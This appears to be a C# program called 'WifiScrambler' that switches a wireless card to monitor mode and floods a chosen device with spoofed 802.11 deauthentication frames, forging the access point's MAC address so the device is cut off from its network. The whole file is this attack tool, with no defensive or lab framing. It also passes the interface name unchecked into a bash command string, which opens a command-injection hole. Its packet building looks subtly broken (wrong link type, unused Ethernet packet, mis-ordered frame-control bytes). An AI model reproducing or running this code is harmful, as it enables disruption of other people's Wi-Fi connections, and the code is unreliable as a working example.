using System;
using System.Diagnostics;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.IO;

namespace WifiScrambler
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: WifiScrambler <interface> <target_mac> <ap_mac>");
                return;
            }

            string interfaceName = args[0];
            string targetMac = args[1];
            string apMac = args[2];

            var devices = CaptureDeviceList.Instance;
            ICaptureDevice device = null;

            foreach (var dev in devices)
            {
                if (dev.Name == interfaceName)
                {
                    device = dev;
                    break;
                }
            }

            if (device == null)
            {
                Console.WriteLine("Interface not found.");
                return;
            }

            EnableMonitorMode(interfaceName);

            try
            {
                device.Open(DeviceMode.Promiscuous);
                SendDeauthPackets(device, targetMac, apMac);
            }
            finally
            {
                device.Close();
                DisableMonitorMode(interfaceName);
            }
        }

        static void EnableMonitorMode(string interfaceName)
        {
            ExecuteCommand($"ip link set {interfaceName} down");
            ExecuteCommand($"iw dev {interfaceName} set type monitor");
            ExecuteCommand($"ip link set {interfaceName} up");
        }

        static void DisableMonitorMode(string interfaceName)
        {
            ExecuteCommand($"ip link set {interfaceName} down");
            ExecuteCommand($"iw dev {interfaceName} set type managed");
            ExecuteCommand($"ip link set {interfaceName} up");
        }

        static void ExecuteCommand(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "/bin/bash",
                    Arguments = $"-c \"{command}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            process.Start();
            process.WaitForExit();
        }

        static void SendDeauthPackets(ICaptureDevice device, string targetMac, string apMac)
        {
            var targetAddress = PhysicalAddress.Parse(targetMac.Replace(":", "-"));
            var apAddress = PhysicalAddress.Parse(apMac.Replace(":", "-"));

            for (int i = 0; i < 100; i++)
            {
                var packet = new EthernetPacket(apAddress, targetAddress, EthernetType.None);
                var deauth = new Dot11DeauthenticationFrame()
                {
                    Destination = targetAddress,
                    Source = apAddress,
                    BSSID = apAddress,
                    ReasonCode = 7
                };

                var rawPacket = new RawCapture(LinkLayers.Ethernet, deauth.Bytes);
                device.SendPacket(rawPacket);
                System.Threading.Thread.Sleep(100);
            }
        }
    }

    public class Dot11DeauthenticationFrame : Packet
    {
        public PhysicalAddress Destination { get; set; }
        public PhysicalAddress Source { get; set; }
        public PhysicalAddress BSSID { get; set; }
        public ushort ReasonCode { get; set; }

        public override void ToBytes(byte[] buffer, int offset)
        {
            var writer = new BinaryWriter(new MemoryStream(buffer, offset, buffer.Length - offset));

            writer.Write((ushort)0xC000); // Frame Control
            writer.Write((ushort)0); // Duration
            writer.Write(Destination.GetAddressBytes());
            writer.Write(Source.GetAddressBytes());
            writer.Write(BSSID.GetAddressBytes());
            writer.Write((ushort)0); // Sequence Control
            writer.Write(ReasonCode);
        }

        public Dot11DeauthenticationFrame()
            : base()
        {
            Bytes = new byte[24 + 2]; // 24-byte 802.11 header + 2-byte reason code
        }
    }
}
